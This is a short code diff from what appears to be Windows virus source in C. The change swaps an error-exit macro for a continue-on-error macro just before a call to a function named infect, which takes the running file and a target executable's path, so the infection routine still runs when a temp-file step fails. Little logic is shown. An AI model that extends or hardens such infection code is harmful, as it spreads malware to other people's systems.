@@ -135,7 +135,7 @@ int main(int argc, char** argv) {
 		
 		
 		TCHAR tempfullPath[MAX_PATH];
-		GetTempFileName(tempPath,TEXT("inf"),0,tempfullPath); __ERROR_EXIT__
+		GetTempFileName(tempPath,TEXT("inf"),0,tempfullPath); __ERROR_CONTINUE__
 
 		infect(tempfullPath,thisFile,origfullPath,sizeOfImage);
     }  
